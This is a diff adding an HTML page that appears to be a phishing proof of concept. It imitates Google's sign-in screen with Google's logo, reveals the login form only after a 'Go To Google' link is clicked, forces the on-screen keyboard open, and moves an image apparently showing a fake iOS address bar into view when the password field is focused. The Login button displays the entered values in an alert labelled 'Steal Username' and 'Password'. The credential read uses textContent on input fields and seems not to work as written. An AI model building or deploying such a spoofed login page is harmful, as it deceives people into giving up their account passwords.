@@ -1,0 +1,176 @@
+
+
+
+<div style="margin-top:0%">
+<!--<select readonly style="height:auto;width:auto;opacity:1" id="c" onclick="t();" >
+<option><a href="x">Show to the link</a> </option>
+</select>-->
+</div>
+
+<div style="margin-top:0%;opacity:1" id="link">
+ <a href="#" onclick="t();w();">Go To Google</a>
+</div>
+
+
+
+
+
+<div id="login" style="opacity:0" class="" >
+
+ <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google Logo" class="logo">
+
+    <h2>Sign in</h2>
+    <p class="subtitle">Use your Google Account</p>
+
+
+<div>Username :</div>      <div><input style="width:200px;border-style: groove;" autofocus="" type="email"  virtualkeyboardpolicy="manual" id="editor"> </div>
+<div>Password :</div> <div><input style="width:200px;border-style: groove;" onfocus="document.getElementById('fake').style.marginTop='34%'"  type="password"  virtualkeyboardpolicy="manual" id="editor1"> </div>
+
+<!-- <div onfocus="document.getElementById('fake').style.marginTop='34%'"   contenteditable style="width:200px;border-style: groove;"  id="editor1"></div> -->
+<div><button onclick="alert('Steal Username='+document.getElementById('editor').textContent+',Password='+document.getElementById('editor1').textContent)">Login</button></div>
+<div>
+</div>
+
+<div><img src="urlbariosfake.jpg" width="60%" style="margin-left:-13%;margin-top:19%" id="fake"></div>
+
+
+<script>
+
+function t()
+{
+      document.getElementById("editor").focus();
+      setTimeout('navigator.virtualKeyboard.show();',1); 
+      
+     // document.getElementById('c').style.width = 'auto';
+     //document.getElementById('c').style.height = 'auto';
+     document.getElementById('link').style.opacity ='1';    
+     //document.getElementById('c').style.opacity ='0';
+}
+function w(){
+
+   setInterval("document.getElementById('link').style.opacity ='0';",1);
+   document.getElementById('login').style.opacity ='1';
+  
+}
+
+
+
+
+
+
+</script>
+
+
+<style>
+body {
+  font-family: 'Arial', sans-serif;
+  margin: 0;
+  background: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.container {
+  width: 100%;
+  max-width: 400px;
+  padding: 40px;
+  box-sizing: border-box;
+  text-align: left;
+}
+
+.logo {
+  width: 90px;
+  margin-bottom: 30px;
+}
+
+h2 {
+  font-weight: 400;
+  margin: 0 0 10px;
+}
+
+.subtitle {
+  margin: 0 0 30px;
+  color: #5f6368;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+}
+
+label {
+  font-size: 14px;
+  color: #5f6368;
+  margin-bottom: 5px;
+}
+
+input[type="text"] {
+  padding: 10px;
+  font-size: 16px;
+  border: 1px solid #dadce0;
+  border-radius: 4px;
+  margin-bottom: 10px;
+}
+
+.forgot a {
+  font-size: 14px;
+  color: #1a73e8;
+  text-decoration: none;
+  margin-bottom: 20px;
+  display: inline-block;
+}
+
+.guest-mode {
+  font-size: 13px;
+  color: #5f6368;
+  margin: 20px 0;
+}
+
+.guest-mode a {
+  color: #1a73e8;
+  text-decoration: none;
+}
+
+.buttons {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+
+.create-account {
+  font-size: 14px;
+  color: #1a73e8;
+  text-decoration: none;
+}
+
+.next-btn {
+  background-color: #1a73e8;
+  color: #fff;
+  padding: 10px 25px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+}
+
+footer {
+  margin-top: 40px;
+  font-size: 12px;
+  color: #5f6368;
+  text-align: center;
+}
+
+footer select {
+  border: none;
+  background: transparent;
+  font-size: 12px;
+  margin-bottom: 10px;
+}
+
+.footer-links a {
+  margin: 0 10px;
+  color: #5f6368;
+  text-decoration: none;
+}
+</style>
